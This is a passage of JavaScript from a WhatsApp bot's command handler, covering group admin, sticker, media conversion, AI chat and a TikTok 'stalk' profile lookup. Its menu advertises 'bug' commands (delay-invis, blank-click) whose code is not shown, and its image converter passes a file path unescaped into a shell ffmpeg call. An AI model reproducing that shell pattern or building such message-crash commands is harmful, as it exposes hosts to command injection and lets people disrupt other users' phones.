    if (!args[0]) return replyphistar('Please provide a TikTok username!');

    const username = args[0];

    try {
        const response = await axios.get(`https://bk9.fun/stalk/tiktok?q=${username}`);

        // Check if the request was successful
        if (response.data.status === true) {
            const profile = response.data.BK9;

            // Format and send profile information with a thumbnail (profile picture)
            await PhistarBotInc.sendMessage(m?.chat, {
                image: { url: profile.profile },
                caption: `*[ TIKTOK PROFILE INFO ]*\n
- *🔖ɴᴀᴍᴇ:* ${profile.name}
- *🔖ᴜsᴇʀɴᴀᴍᴇ:* ${profile.username}
- *👥ғᴏʟʟᴏᴡᴇʀ:* ${profile.followers}
- *🫂ғᴏʟʟᴏᴡɪɴɢ:* ${profile.following}
- *ʟɪᴋᴇs:* ${profile.likes}
-  *📌ʙɪᴏ:* ${profile.bio || 'No bio available'}
- *🏝️ᴅᴇsᴄʀɪᴘᴛɪᴏɴ:*: ${profile.desc || 'No description available'}`
            });

        } else {
            replyphistar('Could not retrieve the profile. Please make sure the username is correct!');
        }
    } catch (error) {
        console.error(error);
        replyphistar('There was an error fetching the TikTok profile information.');
    }
    break;
}
case 'demoteall': {
    if (!m.isGroup) return replyphistar("ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ.")
    
    if (!isCreator) return replyphistar("ᴏᴡɴᴇʀ ᴏɴʟʏ.")
    
    const metadata = await PhistarBotInc.groupMetadata(m.chat)
    let admins = metadata.participants.filter((u) => u.admin && u.id !== botNumber)
    
    for (let admin of admins) {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [admin.id], 'demote')
        await sleep(1000)
    }
    replyphistar(`✅ ᴅᴇᴍᴏᴛᴇᴅ ${admins.length} ᴀᴅᴍɪɴs`)
}
break
}


case 'gpt4': 
case 'gpt3': 
case 'gptpro': {
    if (!text) {
        PhistarBotInc.sendMessage(m.chat, { text: '❓ *Please ask me anything!*' }, { quoted: qtext2 });
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            PhistarBotInc.sendMessage(m.chat, { text: jsonData.BK9 }, { quoted: qtext2 }); // Send the AI's response
        } else {
            PhistarBotInc.sendMessage(m.chat, { text: '*Failed to fetch response from the AI. Please try again later.*' }, { quoted: qtext2 });
        }
    } catch (error) {
        console.error('Error fetching API response:', error);
        PhistarBotInc.sendMessage(m.chat, { text: '*An error occurred while fetching the AI response. Please try again later.*' }, { quoted: qtext2 });
    }
    break;
}
    
            case 'promote': case 'admin': {
    if (!m.isGroup) return replyphistar('For ɢʀᴏᴜᴘs ᴏɴʟʏ');
    if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');
    await PhistarBotInc.sendMessage(from, { react: { text: "🫡", key: m.key } });
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await replyphistar(`@${users.split('@')[0]} ᴘʀᴏᴍᴏᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ`);
    await PhistarBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replyphistar(jsonformat(res))).catch((err) => replyphistar(jsonformat(err)));
    break;
}

case 'demote': case 'unadmin': {
    if (!m.isGroup) return replyphistar('For ɢʀᴏᴜᴘs ᴏɴʟʏ');
    if (!isAdmins && !isCreator) return replyphistar('Restricted ᴛᴏ ᴀᴅᴍɪɴs ᴀɴᴅ ᴄʀᴇᴀᴛᴏʀs');
    await PhistarBotInc.sendMessage(from, { react: { text: "🫡", key: m.key } });
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await replyphistar(`@${users.split('@')[0]} ᴅᴇᴍᴏᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ`);
    await PhistarBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replyphistar(jsonformat(res))).catch((err) => replyphistar(jsonformat(err)));
    break;
}
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!text) return 'Text ?'
                await PhistarBotInc.groupUpdateSubject(m.chat, text).then((res) => replyphistar(mess.success)).catch((err) => replyphistar(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!text) return 'Text ?'
                await PhistarBotInc.groupUpdateDescription(m.chat, text).then((res) => replyphistar(mess.success)).catch((err) => replyphistar(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (!quoted) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PhistarBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PhistarBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                } else {
                    var memeg = await PhistarBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                }
                break
           
            case 'hidetag':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins && !isCreator) return replyphistar(mess.botAdmin)
                PhistarBotInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: qtext2
                })
                break;
           
             case 'totag': {
   if (!m.isGroup) return replyphistar("This command is only used in groups.")
if (!isCreator && !isSudo) 
  return replyphistar('❌ Only the bot owner or sudo users can use this command.');
  if (!m.quoted) return replyphistar(`Reply with ${prefix + command} to a message`);

  PhistarBotInc.sendMessage(m.chat, {
    forward: m.quoted.fakeObj,
    mentions: participants.map(a => a.id)
  });
}
break;
            case 'group':
            case 'grup':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[0] === 'close') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyphistar(`sᴜᴄᴄᴇss ɪɴ ᴄʟᴏsɪɴɢ ᴛʜᴇ ɢʀᴏᴜᴘ 🕊️`)).catch((err) => replyphistar(json(err)))
                } else if (args[0] === 'open') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyphistar(`sᴜᴄᴄᴇss ɪɴ ᴏᴘᴇɴɪɴɢ ᴛʜᴇ ɢʀᴏᴜᴘ 🕊️`)).catch((err) => replyphistar(json(err)))
                } else {
                    replyphistar(`ᴍᴏᴅᴇ ${command}\n\n\nᴛʏᴘᴇ ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[0] === 'open') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴏᴘᴇɴᴇᴅ ɢʀᴏᴜᴘ ᴇᴅɪᴛ ɪɴғᴏ 🕊️`)).catch((err) => replyphistar(json(err)))
                } else if (args[0] === 'close') {
                    await PhistarBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʟᴏsᴇᴅ ɢʀᴏᴜᴘ ᴇᴅɪᴛ ɪɴғᴏ🕊️`)).catch((err) => replyphistar(json(err)))
                } else {
                    replyphistar(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                await PhistarBotInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyphistar(` sᴜᴄᴄᴇssғᴜʟ ʀᴇsᴇᴛ, ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ ${groupMetadata.subject}`)
                    }).catch((err) => replyphistar(json(err)))
                break
// ping command
case 'ping': {
    const start = Date.now();
    const latency = Date.now() - start; // simple ping

    const response = `⚡️ *ᴘᴏɴɢ!*  
_ʀᴇsᴘᴏɴsᴇ sᴘᴇᴇᴅ:_ *${latency} ᴍs*`;

    await PhistarBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            forwardingScore: 2,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃",
                newsletterJid: "120363420981848394@newsletter",
                serverMessageId: Math.floor(Date.now() / 1000)
            }
        }
    }, { quoted: qtext2 });
}
break;
        
        
case 'cid': case 'newsletter': {
if (!text) return replyphistar("ᴇxᴀᴍᴘʟᴇ : ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ")
if (!text.includes("https://whatsapp.com/channel/")) return replyphistar("ʟɪɴᴋ ɪs ɴᴏᴛ ᴠᴀʟɪᴅ ʙʀᴏ ")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await PhistarBotInc.newsletterMetadata("invite", result)
let teks = `
* *ɪᴅ :* ${res.id}
* *ɴᴀᴍᴇ :* ${res.name}
* *ғᴏʟʟᴏᴡᴇʀ:* ${res.subscribers}
* *sᴛᴀᴛᴜs :* ${res.state}
* *ᴠᴇʀɪғɪᴇᴅ :* ${res.verification == "VERIFIED" ? "Verified" : "No"}
`
return replyphistar(teks)
}
break;        
// premium command - FIXED VERSION
case 'buypremium':
case 'buyprem':
case 'premium': {
    let teks = `ʜᴇʏ ${pushname}👋\nᴡᴀɴᴛ ᴛᴏ ʙᴜʏ ᴘʀᴇᴍɪᴜᴍ? ɪᴛ's ғʀᴇᴇ\n\n 5544988138425`;
    
    await PhistarBotInc.sendMessage(m.chat, {
        image: { url: "https://i.postimg.cc/BvY75gbx/IMG-20250625-WA0221.jpg" }, // Ton image
        caption: teks,
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {  
                newsletterName: "𝐍𝐎𝐆𝐀𝐌𝐄-𝐗𝐌𝐃",  
                newsletterJid: "120363420981848394@newsletter"  
            }
        }
    }, { quoted: qtext2 });
}
break;
// script command - FIXED VERSION
case 'sc':
case 'script':
case 'repo':
case 'scriptbot': {
    const response = `
┏━━━━━━━━━━━━━━━┓
┆⬡ ʙᴏᴛ : *𝗡𝗢𝗚𝗔𝗠𝗘-𝗫𝗠𝗗*
┆⬡ ᴄᴏᴍᴍᴀɴᴅ : *sᴄʀɪᴘᴛ*
┆⬡ ᴅᴇᴠ : *𝐍𝐎𝐆𝐀𝐌𝐄 🇭🇹*
┣━━━━━━━━━━━━━━━┛
───────────────────
       𝗦𝗖𝗥𝗜𝗣𝗧 𝗜𝗡𝗙𝗢
╰┄┄┄┄┄┄┄┄┄┄┄┄┄⬡
📥 *ᴄʟɪᴄᴋ ʜᴇʀᴇ ᴛᴏ ɢᴇᴛ ᴛʜᴇ ʙᴏᴛ:*
🔗 http://t.me/NOGAME_XMD_bot

💡 *ᴜsᴀɢᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs:*
├─ ᴛʏᴘᴇ /pair <ʏᴏᴜʀ ɴᴜᴍʙᴇʀ>
└─ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ ᴏɴ ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ

──────────────────
⚡ 𝐍𝐎𝐆𝐀𝐌𝐄 𝐓𝐄𝐂𝐇
───────────────────`;

    await PhistarBotInc.sendMessage(m.chat, {
        text: response,
        contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "ZORO_BAN",
                newsletterJid: "120363420981848394@newsletter",
                serverMessageId: -1
            }
        }
    }, { quoted: qtext2 });
}
break;

            
                case 'google':
    try {
        if (!text) {
            replyphistar("ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ǫᴜᴇʀʏ.\n*ᴇxᴀᴍᴘʟᴇ: .ɢᴏᴏɢʟᴇ ᴡʜᴀᴛ ɪs ᴀ ʙᴏᴛ.*");
            break;
        }

        const axios = require('axios');
        const cheerio = require('cheerio'); // For scraping Google search results

        replyphistar("Searching Google...");

        const query = encodeURIComponent(text.trim());
        const url = `https://www.google.com/search?q=${query}`;

        // Fetch Google search results
        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            },
        });

        // Parse results using Cheerio
        const $ = cheerio.load(data);
        const results = [];

        $(".tF2Cxc").each((index, element) => {
            const title = $(element).find(".DKV0Md").text();
            const link = $(element).find("a").attr("href");
            const snippet = $(element).find(".IsZvec").text();
            if (title && link) {
                results.push({ title, snippet, link });
            }
        });

        // Check if results exist
        if (results.length === 0) {
            replyphistar(`No results found for: "${text}".`);
            break;
        }

        // Format and send results
        let responseMessage = `*ɢᴏᴏɢʟᴇ sᴇᴀʀᴄʜ ʀᴇsᴜʟᴛs ғᴏʀ:* ${text}\n\n`;
        results.slice(0, 5).forEach((result, index) => {
            responseMessage += `*${index + 1}. ${result.title}*\n`;
            responseMessage += `${result.snippet}\n`;
            responseMessage += `_Link:_ ${result.link}\n\n`;
            responseMessage += `────────────────────────\n\n`;
        });

        replyphistar(responseMessage);

    } catch (err) {
        replyphistar("An error occurred during Google search. Please try again.");
        console.error(err.message || err);
    }
    break;
    
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyphistar(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyphistar(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
           
            
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyphistar(respond)
                if (!text) return replyphistar(respond)
                replyphistar(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await PhistarBotInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!args.join(" ")) return replyphistar(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
PhistarBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
PhistarBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyphistar('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await PhistarBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyphistar(`Photo/Video?`)
}
}
break


case 'tempadmin': {
    if (!m.isGroup) return replyphistar(mess.group) ('Use the format: @user time_in_minutes');
    let [userr, time] = text.split(' ');
    if (!userr.startsWith('@')) return replyphistar('Mention a valid user.');
    if (isNaN(time)) return replyphistar('Provide time in minutes.');
    await PhistarBotInc.groupParticipantsUpdate(m.chat, [userr + '@s.whatsapp.net'], 'promote');
    replyphistar(`@${userr} is now an admin for ${time} minutes.`);
    setTimeout(async () => {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userr + '@s.whatsapp.net'], 'demote');
        replyphistar(`@${userr} is no longer an admin.`);
    }, time * 60 * 1000);
    break;
}



case 'poll': {
    if (!text.includes('|')) return replyphistar('Use the format: question|option1|option2|...');
    const [question, ...options] = text.split('|');
    if (options.length < 2) return replyphistar('Provide at least two options.');
    PhistarBotInc.relayMessage(m.chat, {
        pollCreationMessage: {
            name: question,
            options: options.map(o => ({ optionName: o })),
            selectableOptionsCount: options.length
        }
    });
    break;
}


            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    PhistarBotInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: qtext2
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: qtext2
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Phistar.mp3`
                }, {
                    quoted: qtext2
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyphistar(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                PhistarBotInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: qtext2
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyphistar(`Reply sticker with caption *${prefix + command}*`)
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await PhistarBotInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: qtext2
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                replyphistar(mess.wait)
                let media = await PhistarBotInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replyphistar(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replyphistar(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyphistar(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyphistar(`Example : ${prefix + command} 😅+🤔`)
                replyphistar(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await PhistarBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replyphistar(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                    PhistarBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: qtext2
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await PhistarBotInc.downloadAndSaveMediaMessage(quoted)
                    PhistarBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: qtext2
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyphistar(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await PhistarBotInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: qtext2
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'addowner':
                if (!isCreator) return replyphistar(mess.owner)
if (!args[0]) return replyphistar(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await PhistarBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyphistar(`ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ᴀɴᴅ ʀᴇɢɪsᴛᴇʀᴇᴅ ɴᴜᴍʙᴇʀ ᴏɴ ᴡʜᴀᴛsᴀᴘᴘ!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyphistar(`ɴᴜᴍʙᴇʀ ${bnnd} ʜᴀs ʙᴇᴄᴏᴍᴇ ᴀɴ ᴏᴡɴᴇʀ!!!`)
break
case 'delowner':
                if (!isCreator) return replyphistar(mess.owner)
if (!args[0]) return replyphistar(`Use ${prefix+command} nomor\nExample ${prefix+command} 5544988138425`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyphistar(`ᴛʜᴇ ɴᴜᴍʙʀʀ ${ya} ʜᴀs ʙᴇᴇɴ ᴅᴇʟᴇᴛᴇᴅ ғʀᴏᴍ ᴏᴡɴᴇʀ ʟɪsᴛ ʙʏ ᴛʜᴇ ᴏᴡɴᴇʀ!!!`)
break
            
case 'allmenu': 
case 'nogame':
case 'fullmenu': 
case 'menu': {
    await PhistarBotInc.sendMessage(from, { react: { text: "🚀", key: m.key } });
   
    const menuText = `
> ╭━━❖━✪〘 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎 〙✪
> ┋
> ┋❖┋ʙᴏᴛ : *ZORO_BAN*
> ┋❖┋ᴜsᴇʀ : @${sender.split("@")[0]}
> ┋❖┋ʙᴀɪʟᴇʏs : ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ
> ┋❖┋ᴛʏᴘᴇ : ɴᴏᴅᴇᴊs
> ┋❖┋ᴘʀᴇғɪx : «ᴍᴜʟᴛɪ ᴘʀᴇғɪx»
> ┋❖┋ᴠᴇʀsɪᴏɴ : *𝟷.𝟶.𝟶*
> ┋❖┋ᴍᴏᴅᴇ : ${PhistarBotInc.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}
> ┋❖┋ᴅᴇᴠ : *𝗣𝗗𝗚- ZORO*
> ╰━━━━━━━━━━━━━━━✪

       
> ╭━━❖━✪「 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 」✪   
> ┋
> ┋✮┋➣.closetime
> ┋✮┋➣.opentime
> ┋✮┋➣.kick
> ┋✮┋➣.poll
> ┋✮┋➣.demoteall
> ┋✮┋➣.promoteall
> ┋✮┋➣.add
> ┋✮┋➣.promote
> ┋✮┋➣.demote
> ┋✮┋➣.setdesc
> ┋✮┋➣.kickall
> ┋✮┋➣.tempadmin
> ┋✮┋➣.setgpp
> ┋✮┋➣.totag
> ┋✮┋➣.group
> ┋✮┋➣.linkgc
> ┋✮┋➣.revoke
> ┋✮┋➣.antilink
> ┋✮┋➣.antiword
> ┋✮┋➣.antispam
> ┋✮┋➣.welcome
> ┋
> ╰━━━━━━━━━━━━━━━✪


┏━━━━━━━━━━━━━━━┓
     「𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 」

┆⬡ play
┆⬡ ytmp3
┆⬡ ytmp4
┆⬡ download
┆⬡ instagram
┆⬡ playdoc
┆⬡ videodoc
┆⬡ instagram
┆⬡ facebook
┆⬡ mediafire
┆⬡ tiktok
┣━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━┓
       「𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔」
┆⬡ join
┆⬡ shutdown
┆⬡ restart
┆⬡ unblock
┆⬡ block
┆⬡ listblock
┆⬡ broadcast
┆⬡ addowner
┆⬡ delowner
┆⬡ newgc
┆⬡ unblock
┆⬡ delete
┆⬡ mode [public/self]
┆⬡ autoreact [on/off]
┆⬡ autoswview [on/off]
┆⬡ autotyping [on/off]
┆⬡ autorecording [on/off]
┆⬡ autorecordtyp [on/off]
┆⬡ autoread [on/off]
┣━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━┓
      「 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔 」
┆⬡ remini
┆⬡ smeme
┆⬡ take
┆⬡ toimage
┆⬡ wanted
┆⬡ hdvid
┆⬡ tovideo
┆⬡ translate
┆⬡ cut
┆⬡ toaudio
┆⬡ tomp3
┆⬡ tovn
┆⬡ togif
┆⬡ toviewonce
┆⬡ emojimix
┆⬡ vv
┆⬡ url2
┆⬡ url
┣━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━┓
         「 𝐀𝐈 𝐌𝐄𝐍𝐔 」
┆⬡ chatgpt
┆⬡ gpt3
┆⬡ gpt2
┆⬡ openai
┆⬡ google
┆⬡ copilot
┆⬡ deepseek
┣━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━┓
       「 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔 」
┆⬡ script
┆⬡ uptime
┆⬡ owner
┆⬡ alive
┆⬡ menu
┣━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━┓
       「 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔 」
┆⬡ igstalk
┆⬡ img
┆⬡ getpp
┆⬡ getpp
┆⬡ tiktokstalk
┆⬡ igstalk
┆⬡ tempmail
┆⬡ screenshot
┆⬡ checkmail
┆⬡ bible
┆⬡ delmail
┆⬡ fancy
┆⬡ newsletter
┣━━━━━━━━━━━━━━━┛

┏━━━━━━━━━━━━━━━┓
      「 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 」
┆⬡ delay-invis
┆⬡ delay-vis
┆⬡ blank-click
┣━━━━━━━━━━━━━━━┛
───────────────────
⚡ 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐙𝚯𝐑𝚯 𝐓𝐄𝐂𝐇
───────────────────
`;

    const imageUrl = "https://files.catbox.moe/k8xwl5.jpg";

    await PhistarBotInc.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: menuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363420981848394@newsletter',
                    newsletterName: 'Z',
